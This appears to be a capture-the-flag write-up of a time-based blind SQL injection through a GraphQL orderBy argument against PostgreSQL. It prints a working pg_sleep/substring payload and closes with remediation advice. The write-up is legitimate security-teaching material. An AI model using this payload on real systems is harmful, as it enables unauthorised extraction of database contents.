Blind SQLi on a GraphQL endpoint using time-based primitives plus a union-style exfiltration. This entry highlights the payloads that mattered.

## Challenge overview

- Score: 381
- Solves: 12 / 210
- Stack: GraphQL + PostgreSQL + custom WAF

## Approach

1. Abuse the `orderBy` argument to inject arbitrary fragments.
2. Switch to time delays (`pg_sleep`) to dodge the WAF.
3. Combine with `substring` to brute force the flag.

## Core payload

```graphql
query exploit($c:Int!) {
  products(orderBy: "price, (select case when substring(flag,$c,1)='h' then pg_sleep(3) else 0 end)") {
    id
  }
}
```

## Automation

| Variable | Purpose |
| --- | --- |
| `$c` | Character index |
| alphabet | `string.ascii_lowercase + "_{}"` |

A short Python script times each request to recover the next character.

## Aftercare

- Add a rule that rejects multiple commas in `orderBy`.
- Swap to an allow list of safe column names.
